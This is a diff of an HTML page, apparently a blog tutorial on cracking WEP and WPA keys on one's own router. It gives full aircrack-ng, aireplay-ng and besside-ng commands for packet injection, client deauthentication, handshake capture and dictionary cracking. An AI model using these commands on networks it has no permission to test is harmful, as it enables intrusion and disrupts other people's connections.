@@ -118,30 +118,30 @@ testing your own routers :P ).</p>
 <h2 id="common">Common</h2>
 <p>First you have to put your interface in monitor mode:</p>
 <pre><code>airmon-ng # list interfaces
-airmon-ng start wlan0 # this will create a mon0 interface which should be able to inject</code></pre>
-<p>Then, get the info of your router (and adjacents) with <code>airodump-ng mon0</code>.</p>
+airmon-ng start wlan0 # this will create a mon0 interface which should be able to inject
+</code></pre><p>Then, get the info of your router (and adjacents) with <code>airodump-ng mon0</code>.</p>
 <p>When you get yours (should be WEP for this attack), note down ESSID, BSSID and Channel.</p>
 <p>Now focus the sniff in your router:</p>
-<pre><code>airodump-ng -a --ivs -w out --channel &lt;channel&gt; --bssid &lt;bssid&gt; mon0</code></pre>
-<p>This will create an <code>out.cap</code> file and it will write only interesting packages (ivs).</p>
+<pre><code>airodump-ng -a --ivs -w out --channel &lt;channel&gt; --bssid &lt;bssid&gt; mon0
+</code></pre><p>This will create an <code>out.cap</code> file and it will write only interesting packages (ivs).</p>
 <h2 id="wep">WEP</h2>
 <p>You can use my tool <a href="https://github.com/serginator/unix-tools">wepcrackeator</a>.
 It&#39;s really easy to use and will guide you and launch the commands for you.</p>
 <p>If you want to know what you are doing, then here are the commands.</p>
 <p>First execute what&#39;s in <a href="#common">Common</a> section.</p>
 <p>Now we need to associate with the router, execute the following:</p>
-<pre><code>aireplay-ng -1 6000 -o 1 -q 10 --ignore-negative-one -a &lt;bssid&gt; -h &lt;mymac&gt; mon0</code></pre>
-<p>Once associated, we are going to use the p0841 injection attack:</p>
-<pre><code>aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b &lt;bssid&gt; -h &lt;mymac&gt; --ignore-negative-one mon0</code></pre>
-<p>If you want to deauthenticate a client to get packages, use the following command:</p>
-<pre><code>aireplay-ng -0 5 -a &lt;bssid&gt; --ignore-negative-one mon0</code></pre>
-<p>And now you should be getting data for start the cracking process, if not maybe
+<pre><code>aireplay-ng -1 6000 -o 1 -q 10 --ignore-negative-one -a &lt;bssid&gt; -h &lt;mymac&gt; mon0
+</code></pre><p>Once associated, we are going to use the p0841 injection attack:</p>
+<pre><code>aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b &lt;bssid&gt; -h &lt;mymac&gt; --ignore-negative-one mon0
+</code></pre><p>If you want to deauthenticate a client to get packages, use the following command:</p>
+<pre><code>aireplay-ng -0 5 -a &lt;bssid&gt; --ignore-negative-one mon0
+</code></pre><p>And now you should be getting data for start the cracking process, if not maybe
 you need to use other attack like ChopChop or fragmentation, just execute
 <code>aireplay-ng --help</code> and see the other attacks, mayble a simple ARP injection
 could do the trick.</p>
 <p>Now launch aircrack-ng and let it cracking while getting data from the router:</p>
-<pre><code>aircrack-ng -a 1 out.cap</code></pre>
-<p>It will launch the cracking process when it gets more ivs, so just wait for it.</p>
+<pre><code>aircrack-ng -a 1 out.cap
+</code></pre><p>It will launch the cracking process when it gets more ivs, so just wait for it.</p>
 <h2 id="wpa">WPA</h2>
 <p>WPA keys can be obtained using dictionaries (or bruteforce) against handshakes.</p>
 <h3 id="getting-handshakes-using-airodump-ng-and-aireplay-ng">Getting handshakes using airodump-ng and aireplay-ng</h3>
@@ -149,36 +149,36 @@ could do the trick.</p>
 <p>Now we need a client to connect to the router. Connect your phone or other device
 and you&#39;ll see the handshake on top of airodump-ng. If not, try to deauthenticate
 a random client using aireplay-ng:</p>
-<pre><code>aireplay-ng -0 5 -a &lt;bssid&gt; mon0</code></pre>
-<p>or force a client to deauthenticate with:</p>
-<pre><code>aireplay-ng -0 5 -a &lt;bssid&gt; -c &lt;client&gt; mon0</code></pre>
-<p>Once you get the handshake you can stop airodump-ng and start cracking it.</p>
+<pre><code>aireplay-ng -0 5 -a &lt;bssid&gt; mon0
+</code></pre><p>or force a client to deauthenticate with:</p>
+<pre><code>aireplay-ng -0 5 -a &lt;bssid&gt; -c &lt;client&gt; mon0
+</code></pre><p>Once you get the handshake you can stop airodump-ng and start cracking it.</p>
 <h3 id="getting-handshakes-using-besside-ng">Getting handshakes using besside-ng</h3>
 <p>Like in the previous method, first put your interface in monitor mode:</p>
 <pre><code>airmon-ng # lists interfaces
-airmon-ng start wlan0 # this will create a mon0 interface which should be able to inject</code></pre>
-<p>Then, to scan the whole neigborhood (not recommended) use the following command:</p>
-<pre><code>besside-ng -W -vv mon0</code></pre>
-<p>To scan an specific bssid (your router) use:</p>
-<pre><code>besside-ng -W -c &lt;channel&gt; -b &lt;bssid&gt; -vv &lt;interface&gt;</code></pre>
-<p>Both commands will create a file wpa.cap where you have executed the command.
+airmon-ng start wlan0 # this will create a mon0 interface which should be able to inject
+</code></pre><p>Then, to scan the whole neigborhood (not recommended) use the following command:</p>
+<pre><code>besside-ng -W -vv mon0
+</code></pre><p>To scan an specific bssid (your router) use:</p>
+<pre><code>besside-ng -W -c &lt;channel&gt; -b &lt;bssid&gt; -vv &lt;interface&gt;
+</code></pre><p>Both commands will create a file wpa.cap where you have executed the command.
 This file will contain only handshakes, so you can crack it once you get it.
 The command will scan the router and try to deauthenticate clients to get the
 handshake, so it will automate the airodump-ng/aireplay-ng commands.</p>
 <h3 id="cracking-the-handshake">Cracking the handshake</h3>
 <p>Just use <code>aircrack-ng</code> for the task:</p>
 <pre><code>aircrack-ng -w &lt;dict-file&gt; &lt;cap-file&gt;
-# where cap-file is out.cap in first example or wpa.cap in the second one</code></pre>
-<p>If there are several handshakes of several routers, it will ask which one. You
+# where cap-file is out.cap in first example or wpa.cap in the second one
+</code></pre><p>If there are several handshakes of several routers, it will ask which one. You
 can force it at the beginning adding <code>-b &lt;bssid&gt;</code> in the aircrack-ng command.</p>
 <p>If you need to be able to pause aircrack-ng and resume it later you&#39;ll need to
 make use of <code>John the Ripper</code> tool.</p>
 <p>You should launch the cracking process with this command:</p>
-<pre><code>john --session=wpa --stdout --wordlist=&lt;dict-file&gt; | aircrack-ng -w - -b &lt;bssid&gt; wpa.cap</code></pre>
-<p>To pause it just hit Ctrl+c once.</p>
+<pre><code>john --session=wpa --stdout --wordlist=&lt;dict-file&gt; | aircrack-ng -w - -b &lt;bssid&gt; wpa.cap
+</code></pre><p>To pause it just hit Ctrl+c once.</p>
 <p>To restore it, use the following command:</p>
-<pre><code>john --restore=wpa | aircrack-ng -w - -b &lt;bssid&gt; wpa.cap</code></pre>
-<script src='http://localhost:35729/livereload.js'></script>
+<pre><code>john --restore=wpa | aircrack-ng -w - -b &lt;bssid&gt; wpa.cap
+</code></pre><script src='http://localhost:35729/livereload.js'></script>
 
   </body>
 </html>
